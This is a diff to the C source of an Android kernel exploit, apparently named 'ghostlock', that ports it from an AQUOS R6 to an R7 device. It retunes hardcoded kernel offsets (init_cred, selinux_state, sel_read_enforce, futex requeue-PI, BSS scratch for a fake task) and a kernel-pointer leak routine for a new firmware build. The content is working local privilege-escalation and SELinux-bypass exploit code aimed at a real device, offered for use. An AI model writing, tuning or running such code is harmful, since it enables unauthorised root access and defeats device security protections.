@@ -2,8 +2,9 @@
  *
  * Ported from aquos-r6-ghostlock/src/ghostlock54.c (AQUOS R6, 5.4.61-qgki,
  * ThinLTO).  All constants below are from the EXACT device build:
- *   5.10.218-android12-9-00041-g124993efd06e-ab12385094
- *   System.map / vmlinux: ci.android.com build 12385094 (S1, 2026-09-16)
+ *   5.10.237-android12-9-00013-gd09ef2e980e0-ab13968955  (fw 03.00.11)
+ *   System.map / vmlinux: ci.android.com build 13968955 (byte-verified
+ *   against the device boot_b image on 2026-09-21)
  *
  * R6 -> R7 deltas found at port time (disasm-verified on vmlinux-12385094):
  *   - KASLR: slide is 2MB-aligned and the image links _text at a 2MB
@@ -70,17 +71,21 @@
 
 /* ---- R7 target table (System.map 12385094, link _text=0xffffffc008000000) ---- */
 #define LINK_TEXT                 UINT64_C(0xffffffc008000000)
-#define OFF_INIT_TASK             UINT64_C(0x279be80)
-#define OFF_INIT_CRED             UINT64_C(0x27b0a60)   /* vmlinux-sizes: ffffffc00a7b0a60 D init_cred */
-#define OFF_SELINUX_STATE         UINT64_C(0x2a41b98)
-#define OFF_LOG_BUF               UINT64_C(0x2993d50)
-#define OFF_GET_TASK_PID          UINT64_C(0x1756f0)
-#define OFF_TASK_STATE            UINT64_C(0x667558)
-#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x294948)
-#define OFF_SEL_READ_ENFORCE      UINT64_C(0x8cf6b0)
+/* fw 03.00.11 / kernel 5.10.237-android12-9 g d09ef2e980e0 ab13968955
+ * (CI build 13968955, byte-verified against device boot_b 2026-09-21).
+ * Previous set (03.00.06 / 5.10.218 g124993efd06e ab12385094) kept in
+ * git tag v1.0-030006. */
+#define OFF_INIT_TASK             UINT64_C(0x27abe80)
+#define OFF_INIT_CRED             UINT64_C(0x27c0a60)   /* ffffffc00a7c0a60 D init_cred */
+#define OFF_SELINUX_STATE         UINT64_C(0x2a52b90)
+#define OFF_LOG_BUF               UINT64_C(0x29a4d50)   /* __log_buf (bss), NOT log_buf (.data) */
+#define OFF_GET_TASK_PID          UINT64_C(0x1757e8)
+#define OFF_TASK_STATE            UINT64_C(0x66bac4)
+#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x296bb8)
+#define OFF_SEL_READ_ENFORCE      UINT64_C(0x8d68e8)
 /* BSS extent (link-relative, for the leaked-pointer sanity check) */
-#define OFF_BSS_START             UINT64_C(0x2989000)   /* __bss_start   */
-#define OFF_BSS_STOP              UINT64_C(0x2a80c4c)   /* __bss_stop    */
+#define OFF_BSS_START             UINT64_C(0x299a000)   /* __bss_start   */
+#define OFF_BSS_STOP              UINT64_C(0x2a91c0c)   /* __bss_stop    */
 /* Ghost scratch: llvm-nm -S over vmlinux-12385094 shows BSS has exactly ONE
  * symbol-free zero run >= 0x400: __bss_start+0x1188 .. +0x2000 (0xe78
  * bytes).  (System.map-only "gaps" are illusions: sel_net{node,port}_hash
@@ -88,7 +93,7 @@
  * stack_slabs 8K; ucounts_hashtable 1024*8.)  Layout mirrors R6's use of
  * zero BSS: ghost fake-task at run+0x80 (needs through ~+0x990, same last
  * PI field depth as R6), stamp lock at +0xa00, write windows +0xa80.. */
-#define OFF_RUN_START             UINT64_C(0x298a188)   /* __bss_start+0x1188 */
+#define OFF_RUN_START             UINT64_C(0x299b188)   /* __bss_start+0x1188 */
 #define SCRATCH_GHOST_OFF         UINT64_C(0x80)     /* ghost task (~0x910 used) */
 #define SCRATCH_LOCK_OFF          UINT64_C(0xa00)    /* stamp fake lock          */
 #define ARM64_REG_COUNT 33
@@ -335,11 +340,11 @@ static uint64_t leak_task_from_status(const char *status_path,
       uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
       uint64_t abi = ring_u64(ring, size, pos); pos += 8;
       uint64_t state = runtime_text + OFF_TASK_STATE;
-      /* R7 disasm: +0x34 mov x25,x3 (task); before that the arg is x3.
+      /* R7 (13968955) disasm: +0x30 mov x25,x3 (task); before that the arg is x3.
        * x25 keeps the task pointer for the whole function. */
-      if (abi && ip >= state && ip < state + 0x174 &&
+      if (abi && ip >= state && ip < state + 0x170 &&
           pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
-        unsigned task_reg = ip <= state + 0x34 ? 3 : 25;
+        unsigned task_reg = ip <= state + 0x30 ? 3 : 25;
         uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
         if (task >= UINT64_C(0xffffff8000000000) &&
             task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
